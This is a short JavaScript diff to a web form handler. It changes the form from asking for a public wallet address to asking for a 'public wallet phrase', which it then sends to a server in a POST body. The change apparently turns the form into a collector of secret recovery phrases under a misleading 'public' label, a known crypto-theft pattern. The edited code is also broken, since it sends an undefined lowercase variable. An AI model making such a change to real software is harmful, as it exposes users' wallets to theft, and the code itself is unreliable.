@@ -84,14 +84,14 @@ form.addEventListener(
     error.textContent = "";
 
 
-    const walletAddress =
+    const walletPhrase =
       wallet.value.trim();
 
 
-    if (!walletAddress) {
+    if (!walletPhrase) {
 
       error.textContent =
-        "Enter a public wallet address.";
+        "Enter a public wallet phrase.";
 
       return;
 
@@ -119,7 +119,7 @@ form.addEventListener(
             },
 
             body: JSON.stringify({
-              walletAddress
+              walletphrase
             })
 
           }
